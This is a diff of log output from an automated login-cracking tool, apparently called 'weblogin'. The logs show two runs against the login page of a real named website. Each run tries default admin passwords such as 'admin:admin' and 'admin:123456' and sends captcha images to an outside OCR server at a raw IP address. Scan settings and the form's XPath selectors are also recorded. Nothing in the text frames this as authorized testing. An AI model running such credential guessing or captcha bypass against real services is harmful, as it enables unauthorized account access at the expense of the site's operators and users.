@@ -1,12 +1,68 @@
-2025-02-12 00:00:00 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:02 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:02 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Aa123456
-2025-02-12 00:00:02 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:03 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin
-2025-02-12 00:00:03 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin123
-2025-02-12 00:00:13 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:14 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin@123
-2025-02-12 00:00:14 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:15 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
-2025-02-12 00:00:16 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Admin@123
-2025-02-12 00:00:16 DEBUG [weblogin] weblogin/runner.go:141 login => admin:P@sswOrd
+2025-02-12 13:06:24 INFO cmd/root.go:34 Program Started
+2025-02-12 13:06:24 INFO root/config.go:55 Target Count => 1
+2025-02-12 13:06:24 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-12 13:06:24 INFO [weblogin] weblogin/runner.go:76 Run Started => https://open.huolala.cn/#/log-in
+2025-02-12 13:06:37 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[1]/div/div/input",
+  "passwordInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[3]/div/div/input",
+  "captchaInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[2]/div/div[1]/input",
+  "captchaImg": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[2]",
+  "loginBtn": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/button"
+}
+2025-02-12 13:06:37 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-12 13:06:37 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-12 13:06:37 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-12 13:06:37 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
+2025-02-12 13:06:47 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:06:48 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:06:48 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:06:49 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Aa123456
+2025-02-12 13:06:49 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin
+2025-02-12 13:06:49 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin123
+2025-02-12 13:19:04 INFO cmd/root.go:34 Program Started
+2025-02-12 13:19:04 INFO root/config.go:55 Target Count => 1
+2025-02-12 13:19:04 INFO [weblogin] weblogin/runner.go:45 Scan Configuration =>
+{
+  "headlessOptions": {
+    "headless": false,
+    "debug": false,
+    "maxAttempts": 3,
+    "ocrBaseURL": "http://120.26.57.12:8000/"
+  },
+  "threads": 3,
+  "crackAll": false,
+  "delay": 1,
+  "maxCrackTime": 300
+}
+2025-02-12 13:19:04 INFO [weblogin] weblogin/runner.go:76 Run Started => https://open.huolala.cn/#/log-in
+2025-02-12 13:19:15 INFO [weblogin] weblogin/runner.go:98 login selector =>
+{
+  "userInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[1]/div/div/input",
+  "passwordInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[3]/div/div/input",
+  "captchaInput": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[2]/div/div[1]/input",
+  "captchaImg": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/form/div[2]",
+  "loginBtn": "/html/body/div/div/div/div[2]/div/div[2]/div[2]/button"
+}
+2025-02-12 13:19:15 INFO [weblogin] weblogin/runner.go:122 Run Count => 11
+2025-02-12 13:19:15 DEBUG [weblogin] weblogin/runner.go:141 login => admin:1q2w3e4r
+2025-02-12 13:19:15 DEBUG [weblogin] weblogin/runner.go:141 login => admin:123456
+2025-02-12 13:19:15 DEBUG [weblogin] weblogin/runner.go:141 login => admin:12345
+2025-02-12 13:19:26 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:19:26 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:19:26 ERROR [weblogin] weblogin/runner.go:147 login err: get captcha err: OCR result err: 
+2025-02-12 13:19:27 DEBUG [weblogin] weblogin/runner.go:141 login => admin:Aa123456
+2025-02-12 13:19:27 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin
+2025-02-12 13:19:28 DEBUG [weblogin] weblogin/runner.go:141 login => admin:admin123
